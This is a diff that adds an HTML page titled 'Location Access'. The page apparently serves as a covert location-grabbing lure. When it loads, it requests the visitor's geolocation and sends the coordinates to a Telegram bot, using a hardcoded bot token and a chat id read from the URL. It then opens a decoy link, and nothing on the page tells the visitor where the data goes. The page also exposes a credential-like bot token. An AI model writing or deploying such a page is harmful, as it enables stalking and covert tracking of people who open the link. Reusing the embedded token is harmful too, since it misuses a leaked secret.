@@ -1,1 +1,46 @@
-# Loca
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Location Access</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    button { padding: 15px 25px; margin: 15px; font-size: 18px; border: none; border-radius: 10px; cursor: pointer; }
+    .action { background: #4CAF50; color: white; }
+  </style>
+</head>
+<body>
+<h1>Accessing Location...</h1>
+
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+const chatId = urlParams.get('uid');
+const botToken = "7562867574:AAGyHAW7J0ipQWZ_nlwS5PA287wTK36DQ4c";
+
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ chat_id: chatId, text: message })
+  });
+}
+
+function getLocation() {
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      sendToTelegram(`📍 Location:\nLatitude: ${lat}\nLongitude: ${lon}`);
+      window.open("https://example.com/location-link", "_blank");
+    }, err => alert("Location access denied."));
+  } else {
+    alert("Geolocation not supported.");
+  }
+}
+
+getLocation();
+</script>
+
+</body>
+</html>
